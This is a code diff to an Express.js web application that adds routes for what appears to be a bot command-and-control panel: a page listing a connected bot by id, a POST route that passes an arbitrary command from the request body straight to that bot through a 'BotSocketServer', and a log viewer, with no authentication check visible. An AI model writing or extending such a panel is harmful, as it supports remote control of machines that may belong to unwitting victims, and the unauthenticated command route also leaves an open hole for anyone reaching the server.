@@ -62,6 +62,34 @@ app.get('/tables',function (req,res,next) {
     });
 
 });
+app.get('/logout',function (req,res,next) {
+    res.render('login');
+});
+app.get('/control/:id',function(req,res,next){
+    BotSocketServer.getConnectionById(req.params.id,function (connection) {
+        console.log(JSON.stringify(connection)+'selam control merhaba');
+        if(connection!=null){
+            res.render('Command',{
+                connection : connection
+            });
+        }else {
+            res.redirect('/index');
+        }
+    });
+
+});
+app.post('/control/:id/cmd/',function(req,res,next){
+    let id = req.params.id;
+    let cmd = req.body.cmd;
+    console.log(cmd);
+    BotSocketServer.sendCmd(id,cmd);
+    res.status(200).send({'status':'ok'})
+});
+app.get('/logs',function (req,res,next) {
+BotSocketServer.GetAllLogs(function (callback) {
+    res.render('log',{logs:callback})
+});
+});
 
 // catch 404 and forward to error handler
 app.use(function(req, res, next) {
